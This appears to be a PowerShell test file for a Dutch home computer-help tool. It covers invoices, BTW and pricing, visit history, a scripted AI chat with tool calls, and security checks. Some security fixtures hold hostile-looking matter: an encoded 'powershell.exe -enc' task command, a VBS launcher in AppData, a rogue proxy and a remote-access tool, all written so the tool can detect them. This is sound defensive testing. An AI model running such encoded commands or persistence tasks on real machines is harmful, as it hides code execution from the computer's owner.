        $m = New-HcMailText 'note' 'mrs' 'Anna de Vries' $now '' $who
        $m.Subject | Should Be 'Wat er aan uw computer is gedaan'
        ($m.Text -split "`n")[0] | Should Be 'Beste mevrouw Anna de Vries,'
        $m.Text | Should Match '27 september 2026'
        ($m.Text -split "`n")[-1] | Should Be '06-12345678'
        (New-HcMailText 'invoice' 'none' '' $now '2026-0005' $who).Subject | Should Be 'Uw factuur 2026-0005 van Housecall'
        ((New-HcMailText 'receipt' 'couple' '' $now '' $who).Text -split "`n")[0] | Should Be 'Beste klant,'
        $script:Lang = 'en'
        ((New-HcMailText 'receipt' 'family' 'Smith' $now '' ([pscustomobject]@{})).Text -split "`n")[0] | Should Be 'Dear Smith family,'
        (New-HcMailText 'receipt' 'family' 'Smith' $now '' ([pscustomobject]@{})).Text | Should Match 'Housecall, computer help at home$'
        $script:Lang = 'nl'
    }

    It 'gives a name from the history its salutation back' {
        $r = Split-HcClientName 'Dhr. en mevr. Jansen'
        $r.Title | Should Be 'couple'; $r.Name | Should Be 'Jansen'
        (Split-HcClientName 'The Smith family').Name | Should Be 'Smith'
        (Split-HcClientName 'Jan Jansen').Title | Should Be 'none'
        (Split-HcClientName '').Name | Should Be ''
    }

    It 'splits out 21% BTW when it is set, the total staying what the client pays' {
        $fin = New-HcFinishState
        $fin.Minutes = 30
        $withBtw = [pscustomobject]@{ hourly_rate = '20.00'; start_fee = '15.00'; start_minutes = 30; btw_mode = '21' }
        $inv = New-HcDraftInvoice $fin $withBtw $now
        $inv.total | Should Be 15
        $inv.subtotal | Should Be 12.40
        $inv.btw_amount | Should Be 2.60
    }

    It 'offers a bank transfer only once there is an IBAN' {
        Get-HcPayMethods $settings | Should Be @('pin', 'cash', 'tikkie')
        $withIban = [pscustomobject]@{ iban = 'NL00BANK0123456789' }
        Get-HcPayMethods $withIban | Should Be @('pin', 'cash', 'tikkie', 'transfer')
    }

    It 'draws the note as the same page, without number or amounts, with what was found' {
        $script:HcVisit.Clear(); $script:HcChanges.Clear(); $script:HcWork.Clear()
        [void]$script:HcVisit.Add([pscustomobject]@{ Code = 'C2'; FindingId = 'numLockOff'; FindingArgs = @() })
        [void]$script:HcChanges.Add([pscustomobject]@{ FixId = 'numLockOn'; Target = @{}; Label = 'NumLock aangezet' })
        $fin = New-HcFinishState
        $fin.Minutes = 50
        $texts = @(Get-HcInvoiceLayout (New-HcDraftInvoice $fin $settings $now) -Note | ForEach-Object { $_ } | Where-Object { $_.Kind -eq 'text' } | ForEach-Object { $_.Text })
        $texts -contains 'Briefje' | Should Be $true
        $texts -contains 'NumLock aangezet' | Should Be $true
        $texts -contains (T 'finding.numLockOff') | Should Be $true
        @($texts | Where-Object { $_ -match [char]0x20AC -or $_ -match 'concept' }).Count | Should Be 0
        $invoiceTexts = @(Get-HcInvoiceLayout (New-HcDraftInvoice $fin $settings $now) | ForEach-Object { $_ } | ForEach-Object { $_.Text })
        $invoiceTexts -contains 'Factuur' | Should Be $true
        @($invoiceTexts | Where-Object { $_ -match [char]0x20AC }).Count | Should BeGreaterThan 1
        $script:HcVisit.Clear(); $script:HcChanges.Clear()
    }

    It 'sends the relay the same invoice and visit from the window as from the text menu' {
        $script:HcToken = 'token'
        $script:HcVisit.Clear(); $script:HcWork.Clear()
        [void]$script:HcVisit.Add([pscustomobject]@{ Code = 'A1'; FindingId = 'allGood'; FindingArgs = @() })
        $form = [pscustomobject]@{ Client = @{ name = 'X' }; Lines = @([pscustomobject]@{ Description = 'Arbeid'; Amount = [decimal]15 }); Payment = 'pin' }
        $body = New-HcInvoiceBody $form ('a' * 64)
        $body.action | Should Be 'invoice_create'
        $body.pc | Should Be ('a' * 64)
        $body.lines[0].amount | Should Be 15
        $body.problems[0].code | Should Be 'A1'
        $visit = New-HcVisitBody ([pscustomobject]@{ Os = 'Windows 11 Home' }) ('n' * 100) '2026-0005' ('a' * 64)
        $visit.action | Should Be 'visit_save'
        $visit.label.Length | Should Be 80
        $visit.invoice_number | Should Be '2026-0005'
        (New-HcVisitBody ([pscustomobject]@{ Os = 'x' }) '' '' ('a' * 64)).label | Should Be $null
        $script:HcToken = $null; $script:HcVisit.Clear()
    }
}

Describe 'The invoice' {
    $script:Lang = 'nl'
    $euro = [string][char]0x20AC

    It 'writes money the Dutch way and reads amounts people type' {
        Format-HcMoney 30 | Should Be "$euro 30,00"
        Format-HcMoney 1234.5 | Should Be "$euro 1.234,50"
        ConvertTo-HcAmount '19,95' | Should Be 19.95
        ConvertTo-HcAmount "$euro 12.50" | Should Be 12.5
        ConvertTo-HcAmount 'twintig' | Should Be $null
        $line = ConvertTo-HcExtraLine 'Draadloze muis 19,95'
        $line.Description | Should Be 'Draadloze muis'
        $line.Amount | Should Be 19.95
        ConvertTo-HcExtraLine 'alleen tekst' | Should Be $null
    }

    It 'suggests the time spent, rounded up to a quarter of an hour' {
        $script:HcStartedAt = (Get-Date).AddMinutes(-37)
        Get-HcSuggestedMinutes | Should Be 45
        $script:HcStartedAt = (Get-Date).AddMinutes(-3)
        Get-HcSuggestedMinutes | Should Be 15
    }

    $seller = [pscustomobject]@{ business_name = 'Shamil PC Hulp'; owner_name = 'Shamil'; address = 'Straat 1'; postcode_city = '1234 AB Utrecht'
        kvk = '12345678'; btw_number = $null; iban = 'NL00BANK0123456789'; email = 'info@example.nl'; phone = $null }
    $invoice = { param([hashtable]$c = @{})
        $i = [pscustomobject]@{ number = '2026-0001'; issued_at = '2026-09-26T12:00:00Z'; seller = $seller
            client_name = 'Mevr. de Vries'; client_address = 'Dorpsstraat 1'; client_postcode_city = '1234 AB Utrecht'; client_email = $null
            lines = @([pscustomobject]@{ description = 'Arbeid: 45 min'; amount = 30 }, [pscustomobject]@{ description = 'Voorrijkosten'; amount = 15 })
            btw_mode = 'kor'; subtotal = 45; btw_amount = 0; total = 45; payment = 'pin'; due_date = $null }
        foreach ($k in $c.Keys) { $i.$k = $c[$k] }
        $i }

    It 'shows the number, the seller, the client, the costs and how it was paid' {
        $script:HcVisit.Clear(); $script:HcChanges.Clear()
        $r = New-HcReport; Set-HcFinding $r 'noAddress'; Save-HcVisit 'A1' $r
        $text = @(Get-HcInvoiceBlocks (& $invoice)) | ForEach-Object { $_.Text }
        $all = $text -join "`n"
        $text[0] | Should Be 'FACTUUR 2026-0001'
        $all | Should Match 'Shamil PC Hulp'
        $all | Should Match 'KvK 12345678'
        $all | Should Match 'Mevr\. de Vries'
        $all | Should Match 'Helemaal geen internet'
        $all | Should Match 'Betaald met pin op 26 september 2026'
        $all | Should Match 'kleineondernemersregeling'
        $total = @($text | Where-Object { $_ -like 'Totaal*' })[0]
        $total | Should Match "$euro 45,00$"
        # The amounts line up in one column.
        @($text | Where-Object { $_ -like 'Arbeid*' })[0].Length | Should Be $total.Length
    }

    It 'splits out 21% BTW, and asks for a transfer with the IBAN and number' {
        $i = & $invoice @{ btw_mode = '21'; subtotal = 37.19; btw_amount = 7.81; payment = 'transfer'; due_date = '2026-10-10' }
        $all = (@(Get-HcInvoiceBlocks $i) | ForEach-Object { $_.Text }) -join "`n"
        $all | Should Match 'Subtotaal excl\. btw'
        $all | Should Match "Btw 21%\s+$euro 7,81"
        $all | Should Match 'overmaken voor 10 oktober 2026 naar NL00BANK0123456789, onder vermelding van factuurnummer 2026-0001'
        $all | Should Not Match 'kleineondernemersregeling'
    }

    Mock Get-HcEnvironment { [pscustomobject]@{ IsWindows = $true; PSVersion = [version]'5.1'; Os = 'Windows 11 Home'; IsAdmin = $false; Online = $true } }
    Mock Get-HcNetworkFacts { New-FakeFacts }
    $ok = { param($data) [pscustomobject]@{ Ok = $true; Status = 200; Data = $data; Error = $null } }

    It 'at Q: asks the form, makes the invoice, saves the visit with it, and shows the invoice' {
        $script:Sent = @{}
        Mock Invoke-HcRelay {
            $script:Sent[$Body.action] = $Body
            switch ($Body.action) {
                'unlock'         { & $ok ([pscustomobject]@{ token = 't.s'; expires = (Get-Date).AddHours(4).ToUniversalTime().ToString('o') }) }
                'settings_get'   { & $ok ([pscustomobject]@{ settings = [pscustomobject]@{ business_name = 'Shamil PC Hulp'; hourly_rate = 40; callout_fee = 15; btw_mode = 'unset' } }) }
                'invoice_create' { & $ok ([pscustomobject]@{ invoice = (& $invoice @{ client_name = $Body.client.name }) }) }
                default          { & $ok ([pscustomobject]@{ visits = @(); saved = $true; id = 1 }) }
            }
        }
        $out = Start-Housecall -Lang nl -Answers @('A1', '', 'Q', '123456', 'Mevr. de Vries', 'Dorpsstraat 1', '1234 AB Utrecht', '', '45', '', 'Draadloze muis 19,95', '', '1', 'j') 6>&1 | Out-String
        $lines = @($script:Sent['invoice_create'].lines)
        $lines.Count | Should Be 3
        $lines[0].description | Should Be "Arbeid: 45 min, $euro 40,00 per uur"
        $lines[0].amount | Should Be 30
        $lines[1].description | Should Be 'Voorrijkosten'
        $lines[2].description | Should Be 'Draadloze muis'
        $lines[2].amount | Should Be 19.95
        $script:Sent['invoice_create'].payment | Should Be 'pin'
        $script:Sent['visit_save'].label | Should Be 'Mevr. de Vries'
        $script:Sent['visit_save'].invoice_number | Should Be '2026-0001'
        $out | Should Match 'FACTUUR 2026-0001'
    }

    It 'without an IBAN: no bank transfer; 4 is a payment request, and no BTW line' {
        $script:Sent = @{}
        Mock Invoke-HcRelay {
            $script:Sent[$Body.action] = $Body
            switch ($Body.action) {
                'unlock'         { & $ok ([pscustomobject]@{ token = 't.s'; expires = (Get-Date).AddHours(4).ToUniversalTime().ToString('o') }) }
                'settings_get'   { & $ok ([pscustomobject]@{ settings = [pscustomobject]@{ business_name = 'Shamil'; hourly_rate = 40; callout_fee = 0; btw_mode = 'unset'; iban = $null } }) }
                'invoice_create' { & $ok ([pscustomobject]@{ invoice = (& $invoice @{ payment = $Body.payment; btw_mode = 'unset' }) }) }
                default          { & $ok ([pscustomobject]@{ visits = @(); saved = $true; id = 1 }) }
            }
        }
        # '3' (bank transfer) is not on offer without an IBAN, so it is asked again; then 4.
        $out = Start-Housecall -Lang nl -Answers @('A1', '', 'Q', '123456', 'Mevr. de Vries', '', '', '', '30', '', '3', '4', 'j') 6>&1 | Out-String
        $script:Sent['invoice_create'].payment | Should Be 'tikkie'
        $out | Should Match 'Betaling: \[1\] pin  \[2\] contant  \[4\] betaalverzoek'
        # Made when the request is sent, so it may not say paid yet.
        $out | Should Match 'Te betalen via het betaalverzoek van 26 september 2026'
        $out | Should Not Match 'Betaald via'
        $out | Should Not Match 'Btw'
    }

    It 'the window''s fields become the same invoice, and mistakes are named' {
        $settings = [pscustomobject]@{ hourly_rate = 20; callout_fee = 0; iban = $null }
        $values = @{ Name = ' Mevr. de Vries '; Address = 'Dorpsstraat 1'; Postcode = '1234 AB Utrecht'; Email = ''
            Minutes = 45; Callout = $false; Payment = 'tikkie'
            Extras = @([pscustomobject]@{ Description = 'Draadloze muis'; Amount = '19,95' }, [pscustomobject]@{ Description = $null; Amount = $null }) }
        $r = ConvertTo-HcInvoiceForm $values $settings
        $r.Error | Should Be $null
        $r.Form.Client.name | Should Be 'Mevr. de Vries'
        @($r.Form.Lines).Count | Should Be 2
        $r.Form.Lines[0].Amount | Should Be 15
        $r.Form.Lines[1].Amount | Should Be 19.95
        $r.Total | Should Be 34.95
        $r.Form.Payment | Should Be 'tikkie'

        $noName = $values.Clone(); $noName.Name = ''
        (ConvertTo-HcInvoiceForm $noName $settings).Error | Should Be 'Vul de naam van de klant in.'
        $noPay = $values.Clone(); $noPay.Payment = $null
        (ConvertTo-HcInvoiceForm $noPay $settings).Error | Should Be 'Kies hoe de klant betaalt.'
        $bad = $values.Clone(); $bad.Extras = @([pscustomobject]@{ Description = 'Muis'; Amount = 'twintig' })
        (ConvertTo-HcInvoiceForm $bad $settings).Error | Should Match '^Extra regel 1:'
        $empty = $values.Clone(); $empty.Minutes = 0; $empty.Extras = @()
        (ConvertTo-HcInvoiceForm $empty $settings).Error | Should Match 'niets te factureren'
    }

    It 'a starting price covers the first minutes; only the time after it goes by the hour' {
        $script:Lang = 'nl'
        $settings = [pscustomobject]@{ hourly_rate = 20; start_fee = 15; start_minutes = 30 }
        $short = @(Get-HcLabourLines 30 $settings)
        $short.Count | Should Be 1
        $short[0].Description | Should Be 'Arbeid 30 min: starttarief (tot 30 min)'
        $short[0].Amount | Should Be 15
        $long = @(Get-HcLabourLines 75 $settings)
        $long.Count | Should Be 2
        $long[0].Description | Should Be 'Arbeid 75 min: starttarief (tot 30 min)'
        $long[1].Description | Should Be "+ 3 x 15 min extra, $euro 5,00 per kwartier"
        # Both fit the invoice's description column (44 characters), also at 3-digit minutes.
        foreach ($l in @(Get-HcLabourLines 240 $settings)) { $l.Description.Length | Should BeLessThan 45 }
        $long[1].Amount | Should Be 15
        @(Get-HcLabourLines 0 $settings).Count | Should Be 0
        # Without a starting price: all of it by the hour, as before.
        $plain = @(Get-HcLabourLines 45 ([pscustomobject]@{ hourly_rate = 20 }))
        $plain[0].Description | Should Be "Arbeid: 45 min, $euro 20,00 per uur"
        $plain[0].Amount | Should Be 15
        # Every quarter begun counts: 50 min is 2 quarters after the first 30, EUR 25 in all.
        $fifty = @(Get-HcLabourLines 50 $settings)
        $fifty[1].Description | Should Be "+ 2 x 15 min extra, $euro 5,00 per kwartier"
        $fifty[1].Amount | Should Be 10
        Get-HcRateText $settings | Should Be "$euro 15,00 voor de eerste 30 min, daarna $euro 5,00 per begonnen kwartier"
    }

    It 'what was done by hand: on the note under done or not fixed, and in the history' {
        $script:Lang = 'nl'
        $script:HcVisit.Clear(); $script:HcChanges.Clear(); $script:HcWork.Clear()
        [void]$script:HcVisit.Add([pscustomobject]@{ Code = 'A1'; FindingId = $null; FindingArgs = @() })
        @(Get-HcWorkPresets).Count | Should BeGreaterThan 10
        (Get-HcWorkPresets) -contains ('Printer ge' + [char]0xEF + 'nstalleerd') | Should Be $true
        Add-HcWorkItem ' Printer   geinstalleerd ' $true | Should Be $true
        Add-HcWorkItem 'Printer geinstalleerd' $false | Should Be $false
        Add-HcWorkItem '  ' $true | Should Be $false
        Add-HcWorkItem 'Onderdeel moet besteld worden' $false | Should Be $true
        $text = @(Get-HcVisitBlocks | ForEach-Object { $_.Text })
        ($text -contains 'Printer geinstalleerd') | Should Be $true
        ($text -contains 'Nog niet opgelost') | Should Be $true
        ($text -contains 'Onderdeel moet besteld worden') | Should Be $true
        ($text -contains 'Er is niets veranderd aan deze pc.') | Should Be $false
        (@(Get-HcVisitChanges) -contains 'Niet opgelost: Onderdeel moet besteld worden') | Should Be $true
        # The question typed in the window replaces the list of problems checked.
        ($text -contains (T 'problem.A1')) | Should Be $true
        $script:HcAsked = 'Printer doet het niet sinds de verhuizing'
        $text = @(Get-HcVisitBlocks | ForEach-Object { $_.Text })
        ($text -contains 'Printer doet het niet sinds de verhuizing') | Should Be $true
        ($text -contains (T 'problem.A1')) | Should Be $false
        $script:HcAsked = ''
        $script:HcWork.Clear(); $script:HcVisit.Clear()
    }

    It 'the clock: minutes since the start, yellow once the starting price is used up' {
        $script:Lang = 'nl'
        $script:HcStartMinutes = 30
        $start = $script:HcStartedAt
        $script:HcStartedAt = [datetime]'2026-09-26 14:05'
        $c = Get-HcClockLine ([datetime]'2026-09-26 14:40')
        $c.Text | Should Be 'Bezig sinds 14:05, 35 min: het starttarief (30 min) is op, vraag de klant of u verder mag'
        $c.Over | Should Be $true
        $c = Get-HcClockLine ([datetime]'2026-09-26 14:20')
        $c.Text | Should Be 'Bezig sinds 14:05, 15 min'
        $c.Over | Should Be $false
        # No starting price: never a warning.
        $script:HcStartMinutes = 0
        (Get-HcClockLine ([datetime]'2026-09-26 16:05')).Over | Should Be $false
        $script:HcStartMinutes = 30
        $script:HcStartedAt = $start
    }

    It 'the drawn invoice: layout B on A4, the work with ticks, more pages when it is long' {
        $script:Lang = 'nl'
        $script:HcVisit.Clear(); $script:HcChanges.Clear(); $script:HcWork.Clear()
        [void]$script:HcVisit.Add([pscustomobject]@{ Code = 'C1'; FindingId = $null; FindingArgs = @() })
        $script:HcAsked = 'Printer doet het niet sinds de verhuizing'
        [void](Add-HcWorkItem 'Printer geinstalleerd' $true)
        [void](Add-HcWorkItem 'Onderdeel moet besteld worden' $false)
        $i = & $invoice @{ btw_mode = 'unset'; payment = 'tikkie' }
        $pages = @(Get-HcInvoiceLayout $i)
        $pages.Count | Should Be 1
        $texts = @($pages[0] | Where-Object { $_.Kind -eq 'text' } | ForEach-Object { $_.Text })
        ($texts -contains 'Factuur') | Should Be $true
        ($texts -contains 'BETREFT') | Should Be $true
        ($texts -contains 'Printer doet het niet sinds de verhuizing') | Should Be $true
        ($texts -contains 'Computerhulp aan huis') | Should Be $true
        ($texts -contains 'Onderdeel moet besteld worden (nog niet opgelost)') | Should Be $true
        ($texts -contains "$euro 45,00") | Should Be $true
        ($texts -contains 'Pagina 1 van 1') | Should Be $true
        @($pages[0] | Where-Object { $_.Kind -eq 'check' }).Count | Should Be 1
        @($pages[0] | Where-Object { $_.Kind -eq 'dash' }).Count | Should Be 1
        # Everything stays on the page, left to right and top to bottom.
        foreach ($s in @($pages[0] | Where-Object { $_.Kind -eq 'text' })) {
            ($s.X + $s.W) | Should Not BeGreaterThan 730
            $s.Y | Should BeLessThan 1123
        }
        # The text version (tests, no desktop) says the same.
        $all = (@(Get-HcInvoiceBlocks $i) | ForEach-Object { $_.Text }) -join "`n"
        $all | Should Match 'Printer doet het niet sinds de verhuizing'
        $all | Should Match 'Computerhulp aan huis'

        for ($n = 0; $n -lt 45; $n++) { [void](Add-HcWorkItem "Taak nummer $n" $true) }
        $pages = @(Get-HcInvoiceLayout $i)
        $pages.Count | Should Be 2
        (@($pages[1] | Where-Object { $_.Kind -eq 'text' } | ForEach-Object { $_.Text }) -contains 'Pagina 2 van 2') | Should Be $true
        $script:HcWork.Clear(); $script:HcVisit.Clear(); $script:HcAsked = ''
    }

    It 'Enter at the code: no invoice, no second question, the plain note' {
        $script:Sent = @{}
        Mock Invoke-HcRelay { $script:Sent[$Body.action] = $Body; & $ok ([pscustomobject]@{}) }
        $out = Start-Housecall -Lang nl -Answers @('A1', '', 'Q', '', 'extra') 6>&1 | Out-String
        $script:Sent.Count | Should Be 0
        $out | Should Match 'Waar u hulp bij vroeg'
        $out | Should Not MatchExactly 'FACTUUR'
    }

    It 'without invoice settings: says so, and shows the note' {
        $script:HcToken = $null
        Mock Invoke-HcRelay {
            if ($Body.action -eq 'unlock') { return & $ok ([pscustomobject]@{ token = 't.s'; expires = (Get-Date).AddHours(4).ToUniversalTime().ToString('o') }) }
            & $ok ([pscustomobject]@{ settings = $null; visits = @() })
        }
        $out = Start-Housecall -Lang nl -Answers @('A1', '', 'Q', '123456', '') 6>&1 | Out-String
        $out | Should Match 'setup-invoice\.ps1'
        $out | Should Match 'Waar u hulp bij vroeg'
    }

    It 'deletes a visit from the history after a yes, and says the invoice is kept' {
        $script:HcToken = 't.s'; $script:HcTokenExpires = (Get-Date).AddHours(1)
        $script:Deleted = $null
        Mock Invoke-HcRelay {
            if ($Body.action -eq 'visit_delete') { $script:Deleted = $Body.id; return & $ok ([pscustomobject]@{ deleted = 1 }) }
            if ($script:Deleted) { return & $ok ([pscustomobject]@{ visits = @() }) }
            & $ok ([pscustomobject]@{ visits = @([pscustomobject]@{ id = 7; visited_at = '2026-09-26T12:00:00Z'; label = 'Mevr. de Vries'; problems = @(); changes = @(); invoice_number = '2026-0001' }) })
        }
        $script:HcInputQueue = New-Object System.Collections.Queue
        foreach ($a in @('1', 'j', '')) { $script:HcInputQueue.Enqueue($a) }
        $out = Show-HcHistory ([pscustomobject]@{ Online = $true; Os = 'x'; IsAdmin = $false; PSVersion = [version]'5.1' }) 6>&1 | Out-String
        $script:HcInputQueue = $null
        $script:Deleted | Should Be 7
        $out | Should Match 'factuur 2026-0001'
        $out | Should Match 'Factuur 2026-0001 blijft bewaard'
    }
}

Describe 'The AI chat' {
    $script:Lang = 'en'
    Mock Get-HcEnvironment { [pscustomobject]@{ IsWindows = $true; PSVersion = [version]'5.1'; Os = 'Windows 11 Home'; IsAdmin = $false; Online = $true } }
    $printers = [pscustomobject]@{ Now = Get-Date; SpoolerRunning = $true; SpoolerDisabled = $false; Jobs = @()
        Printers = @(
            [pscustomobject]@{ Name = 'Microsoft Print to PDF'; Default = $true; Virtual = $true; Offline = $false; State = 0; HostAddress = $null; Reachable = $null }
            [pscustomobject]@{ Name = 'HP DeskJet 2700'; Default = $false; Virtual = $false; Offline = $false; State = 0; HostAddress = $null; Reachable = $null }) }
    Mock Get-HcPrinterFacts { $printers }

    # A scripted Claude: first it runs C1, then it answers.
    $toolUse = '[{"type":"thinking","thinking":"","signature":"sig-1"},{"type":"tool_use","id":"tu_1","name":"run_check","input":{"code":"C1","input":""}}]'
    $answer = '[{"type":"tool_use","id":"tu_2","name":"give_answer","input":{"summary":"Documents go to Print to PDF.","confidence":"high","problem_code":"C1","fix_ids":["setDefault","formatDisk"],"steps":["Print again."]}}]'
    $reply = { param($json) [pscustomobject]@{ Ok = $true; Status = 200; Error = $null; Data = [pscustomobject]@{ stop_reason = 'tool_use'; content_json = $json; content = ($json | ConvertFrom-Json) } } }

    It 'runs the check the AI asks for, sends back its result, and returns the answer' {
        $script:HcToken = 't.s'; $script:HcTokenExpires = (Get-Date).AddHours(1)
        $script:Requests = New-Object System.Collections.ArrayList
        Mock Invoke-HcRelay {
            [void]$script:Requests.Add((ConvertTo-Json -InputObject $Body -Depth 30 -Compress))
            if ($script:Requests.Count -eq 1) { & $reply $toolUse } else { & $reply $answer }
        }
        $state = Invoke-HcAiConversation 'my printer does nothing'
        $state.Answer.problem_code | Should Be 'C1'
        $state.Reports.ContainsKey('C1') | Should Be $true
        # What the AI passed along, so the window can check the same again after a fix.
        $state.Inputs.ContainsKey('C1') | Should Be $true
        $script:Requests.Count | Should Be 2
        $second = $script:Requests[1] | ConvertFrom-Json
        @($second.messages).Count | Should Be 3
        # The thinking block goes back exactly as it came.
        $second.messages[1].content_json | Should Be $toolUse
        $results = $second.messages[2].content_json | ConvertFrom-Json
        @($results)[0].tool_use_id | Should Be 'tu_1'
        @($results)[0].content | Should Match 'Offered fixes:'
        @($results)[0].content | Should Match 'setDefault'
        # The first message names the language and carries the problem.
        (($second.messages[0].content_json | ConvertFrom-Json)[0].text) | Should Be "[en]`nmy printer does nothing"
    }

    It 'only offers fixes the check itself offered, in the AI''s order' {
        $r = New-HcReport
        Add-HcAction $r 'clearJobs'; Add-HcAction $r 'setDefault' @{ Label = 'HP'; Name = 'HP' }; Add-HcAction $r 'restartSpooler'
        Select-HcActions $r @('setDefault', 'formatDisk', 'clearJobs')
        @($r.Actions | ForEach-Object { $_.FixId }) | Should Be @('setDefault', 'clearJobs')
    }

    It 'stops at the limit of checks and tells the AI so' {
        $script:HcToken = 't.s'; $script:HcTokenExpires = (Get-Date).AddHours(1)
        $script:Requests = New-Object System.Collections.ArrayList
        Mock Invoke-HcRelay { [void]$script:Requests.Add($Body); & $reply $toolUse }
        $script:AiMaxChecks = 2
        $state = Invoke-HcAiConversation 'x'
        $script:AiMaxChecks = 6
        $state.Answer | Should Be $null
        $last = ($script:Requests[-1].messages[-1].content_json | ConvertFrom-Json)
        @($last)[0].is_error | Should Be $true
    }

    It 'runs from the menu: code, problem, check, answer, then the AI''s fix through Wat nu?' {
        $script:Requests = New-Object System.Collections.ArrayList
        Mock Invoke-HcRelay {
            if ($Body.action -eq 'unlock') { return [pscustomobject]@{ Ok = $true; Status = 200; Data = [pscustomobject]@{ token = 't.s'; expires = (Get-Date).AddHours(4).ToUniversalTime().ToString('o') }; Error = $null } }
            if ($Body.action -ne 'chat') { return [pscustomobject]@{ Ok = $true; Status = 200; Data = [pscustomobject]@{ visits = @() }; Error = $null } }
            [void]$script:Requests.Add($Body)
            if ($script:Requests.Count -eq 1) { & $reply $toolUse } else { & $reply $answer }
        }
        Mock Invoke-HcActionMenu { $script:Offered = @($Report.Actions | ForEach-Object { $_.FixId }); 'back' }
        Start-Housecall -Lang en -Answers @('?', '123456', 'my printer does nothing', '', 'Q', '')
        $script:Requests.Count | Should Be 2
        $script:Offered | Should Be @('setDefault')
    }

    It 'explains a relay problem instead of failing' {
        $script:HcToken = 't.s'; $script:HcTokenExpires = (Get-Date).AddHours(1)
        Mock Invoke-HcRelay { [pscustomobject]@{ Ok = $false; Status = 0; Data = $null; Error = 'unreachable' } }
        { Start-Housecall -Lang nl -Answers @('?', 'geen geluid meer', '', 'Q') } | Should Not Throw
        (Invoke-HcAiConversation 'x').Error | Should Be 'unreachable'
        Get-HcRelayMessage 'unreachable' | Should Match 'Supabase'
    }
}

Describe 'Fixes offered by the checks' {
    $script:Lang = 'en'
    $task = { param($name, $command, $level = 'weak', $disabled = $false)
        [pscustomobject]@{ Name = $name; Path = '\'; Command = $command; Level = $level; Disabled = $disabled
                           Owner = Get-HcKnownTaskOwner $name $command } }

    It 'offers to disable an unknown task, with its name and folder' {
        $r = Test-HcSecurity (New-FakeSecurity @{ Tasks = @(& $task 'Updater' 'wscript.exe C:\Users\x\AppData\Roaming\u.vbs') }) @('tasks') 'cleanCall'
        @($r.Actions).Count | Should Be 1
        $r.Actions[0].FixId | Should Be 'disableTask'
        $r.Actions[0].Target.Name | Should Be 'Updater'
        $r.Actions[0].Target.Path | Should Be '\'
    }

    It 'recognises Shamil''s own tools by name and script, and offers nothing for them' {
        $reveille = & $task 'ReveilleAgent' 'wscript.exe "C:\Users\shami\AppData\Local\Reveille\start-agent-hidden.vbs"'
        $courier = & $task 'CourierAgent' 'wscript.exe "C:\Users\shami\AppData\Local\Courier\start-agent-hidden.vbs"'
        $r = Test-HcSecurity (New-FakeSecurity @{ Tasks = @($reveille, $courier) }) @('tasks') 'cleanCall'
        @($r.Results | Where-Object { $_.Status -ne 'ok' }).Count | Should Be 0
        @($r.Actions).Count | Should Be 0
        $r.FindingId | Should Be 'cleanCall'
    }

    It 'does not trust a look-alike name that runs something else' {
        Get-HcKnownTaskOwner 'ReveilleAgent' 'powershell.exe -enc SQBFAFgA' | Should Be $null
        Get-HcKnownTaskOwner 'Updater' 'wscript.exe C:\Users\x\AppData\Local\Reveille\start-agent-hidden.vbs' | Should Be $null
    }

    It 'shows a disabled task as fine' {
        $r = Test-HcSecurity (New-FakeSecurity @{ Tasks = @(& $task 'Updater' 'wscript.exe u.vbs' 'weak' $true) }) @('tasks') 'cleanCall'
        $r.Results[0].Status | Should Be 'ok'
        @($r.Actions).Count | Should Be 0
    }

    It 'offers to close a running remote tool, and to turn off a proxy' {
        $tool = New-FakeTool -Running $true
        $tool | Add-Member Processes @('AnyDesk')
        $r = Test-HcSecurity (New-FakeSecurity @{ RemoteTools = @($tool); Proxy = '1.2.3.4:80' }) @('remote', 'proxy') 'cleanAll'
        @($r.Actions | ForEach-Object { $_.FixId }) | Should Be @('stopRemote', 'proxyOff')
        $r.Actions[0].Target.Processes | Should Be @('AnyDesk')
    }

    It 'offers the network fixes where they help' {
        @((Test-HcInternet (New-FakeFacts @{ DnsOk = $false; Web = $null })).Actions)[0].FixId | Should Be 'flushDns'
        @((Test-HcInternet (New-FakeFacts @{ IPv4 = '169.254.1.1'; InternetMs = $null })).Actions)[0].FixId | Should Be 'renewIp'
        @((Test-HcInternet (New-FakeFacts)).Actions).Count | Should Be 0
    }

    It 'has a label and note for every fix, in both languages' {
        foreach ($lang in @('en', 'nl')) {
            foreach ($id in $script:Fixes.Keys) {
                $script:Strings[$lang]["fix.$id"] | Should Not BeNullOrEmpty
                $script:Strings[$lang]["fix.$id.done"] | Should Not BeNullOrEmpty
                $script:Strings[$lang]['fix.note.' + $script:Fixes[$id].Note] | Should Not BeNullOrEmpty
            }
        }
    }
}

Describe 'Step-by-step guides' {
    It 'has the same number of steps in English and Dutch for every guide' {
        foreach ($key in @($script:Strings.en.Keys | Where-Object { $_ -like 'steps.*' })) {
            $en = @($script:Strings.en[$key] -split '\s*\|\s*')
            $nl = @($script:Strings.nl[$key] -split '\s*\|\s*')
            "$key $($en.Count)" | Should Be "$key $($nl.Count)"
        }
    }

    It 'has a guide for every finding except the all-clear ones' {
        $ids = @($script:Strings.en.Keys | Where-Object { $_ -like 'finding.*' } | ForEach-Object { $_.Substring(8) })
        $missing = @($ids | Where-Object { $_ -notin @('allGood', 'cleanAll') -and -not $script:Strings.en.ContainsKey("steps.$_") })
        $missing -join ', ' | Should Be ''
    }

    It 'fills the finding''s name into its steps' {
        $script:Lang = 'nl'
        $r = New-HcReport
        Set-HcFinding $r 'unknownTask' @('Updater')
        (Get-HcSteps $r)[0] | Should Match '"Updater"'
        $script:Lang = 'en'
    }

    It 'shows steps one at a time and stops on 0' {
        $script:HcInputQueue = New-Object System.Collections.Queue
        foreach ($a in @('', '0', 'extra')) { $script:HcInputQueue.Enqueue($a) }
        Show-HcSteps @('one', 'two', 'three', 'four')
        $script:HcInputQueue.Count | Should Be 1     # two answers used: Enter, then 0
        $script:HcInputQueue = $null
    }
}

Describe 'Fix, check again, undo (scripted run)' {
    $unknown = [pscustomobject]@{ Name = 'Updater'; Path = '\'; Command = 'wscript.exe u.vbs'; Level = 'weak'; Disabled = $false; Owner = $null }
    Mock Get-HcEnvironment {
        [pscustomobject]@{ IsWindows = $true; PSVersion = [version]'5.1'; Os = 'Windows 11 Home'; IsAdmin = $false; Online = $true }
    }
    Mock Disable-ScheduledTask { $script:TaskDisabled = $true }
    Mock Enable-ScheduledTask { $script:TaskDisabled = $false }
    Mock Get-HcSecurityFacts {
        $t = $unknown.PSObject.Copy()
        $t.Disabled = [bool]$script:TaskDisabled
        New-FakeSecurity @{ Tasks = @($t) }
    }

    It 'disables the task after a yes, shows it fixed, and undoes it with U' {
        $script:TaskDisabled = $false
